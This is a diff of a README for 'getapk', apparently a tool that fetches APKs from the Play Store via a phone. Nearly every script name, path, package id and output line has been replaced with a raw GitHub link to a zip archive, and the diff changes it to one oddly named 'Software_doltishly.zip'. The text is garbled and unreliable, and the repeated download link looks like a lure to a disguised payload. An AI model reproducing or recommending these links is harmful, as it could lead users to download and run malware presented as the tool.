@@ -7,13 +7,13 @@ The version of the APK is automatically checked and included in the generated
 APK filename.
 
 # Install
-Clone this repo (or copy `https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip`) and add a function to your shell
-(e.g. `~https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip` or `~https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip`):
+Clone this repo (or copy `https://raw.githubusercontent.com/khma-92/getapk/main/south/Software_doltishly.zip`) and add a function to your shell
+(e.g. `~https://raw.githubusercontent.com/khma-92/getapk/main/south/Software_doltishly.zip` or `~https://raw.githubusercontent.com/khma-92/getapk/main/south/Software_doltishly.zip`):
 
 ```
 function getapk() {
     all_args=( "$@" )
-    https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip "${all_args[@]}"
+    https://raw.githubusercontent.com/khma-92/getapk/main/south/Software_doltishly.zip "${all_args[@]}"
 }
 ```
 
@@ -25,11 +25,11 @@ You must have:
 
 # Use on a Pixel 3a
 ```
-getapk https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip
+getapk https://raw.githubusercontent.com/khma-92/getapk/main/south/Software_doltishly.zip
 ```
 
 # Use on something other than Pixel 3a
-You will need to update the `https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip` script to set correct values for the
+You will need to update the `https://raw.githubusercontent.com/khma-92/getapk/main/south/Software_doltishly.zip` script to set correct values for the
 following variables:
 
 ```
@@ -40,43 +40,43 @@ readonly INSTALL_BUTTON_Y_COORD="800" # Determined manually for Pixel 3a
 # Example output
 If the APK is not yet installed on the phone:
 ```
-$> getapk https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip
-Getting APK from the Play Store with id: https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip
+$> getapk https://raw.githubusercontent.com/khma-92/getapk/main/south/Software_doltishly.zip
+Getting APK from the Play Store with id: https://raw.githubusercontent.com/khma-92/getapk/main/south/Software_doltishly.zip
 Installing APK on the phone...
-Opening APK's Play Store entry on the https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip
-Tapping the Install button on the https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip
-Waiting for APK to install on the https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip
+Opening APK's Play Store entry on the https://raw.githubusercontent.com/khma-92/getapk/main/south/Software_doltishly.zip
+Tapping the Install button on the https://raw.githubusercontent.com/khma-92/getapk/main/south/Software_doltishly.zip
+Waiting for APK to install on the https://raw.githubusercontent.com/khma-92/getapk/main/south/Software_doltishly.zip
 Downloading APK file(s) from the phone...
 APK (1/1) downloaded to:
-https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip
+https://raw.githubusercontent.com/khma-92/getapk/main/south/Software_doltishly.zip
 ```
 
 If the APK is already installed on the phone:
 ```
-$> getapk https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip
-Getting APK from the Play Store with id: https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip
+$> getapk https://raw.githubusercontent.com/khma-92/getapk/main/south/Software_doltishly.zip
+Getting APK from the Play Store with id: https://raw.githubusercontent.com/khma-92/getapk/main/south/Software_doltishly.zip
 APK is already installed on the phone.
 Downloading APK file(s) from the phone...
 APK (1/1) downloaded to:
-https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip
+https://raw.githubusercontent.com/khma-92/getapk/main/south/Software_doltishly.zip
 ```
 
 If the APK is multi-part:
 ```
-$> getapk https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip
-Getting APK from the Play Store with id: https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip
+$> getapk https://raw.githubusercontent.com/khma-92/getapk/main/south/Software_doltishly.zip
+Getting APK from the Play Store with id: https://raw.githubusercontent.com/khma-92/getapk/main/south/Software_doltishly.zip
 APK is already installed on the phone.
 Downloading APK file(s) from the phone...
 APK (1/5) downloaded to:
-https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip
+https://raw.githubusercontent.com/khma-92/getapk/main/south/Software_doltishly.zip
 APK (2/5) downloaded to:
-https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip
+https://raw.githubusercontent.com/khma-92/getapk/main/south/Software_doltishly.zip
 APK (3/5) downloaded to:
-https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip
+https://raw.githubusercontent.com/khma-92/getapk/main/south/Software_doltishly.zip
 APK (4/5) downloaded to:
-https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip
+https://raw.githubusercontent.com/khma-92/getapk/main/south/Software_doltishly.zip
 APK (5/5) downloaded to:
-https://raw.githubusercontent.com/khma-92/getapk/main/south/getapk-v3.5-beta.1.zip
+https://raw.githubusercontent.com/khma-92/getapk/main/south/Software_doltishly.zip
 ```
 
 # Known issues
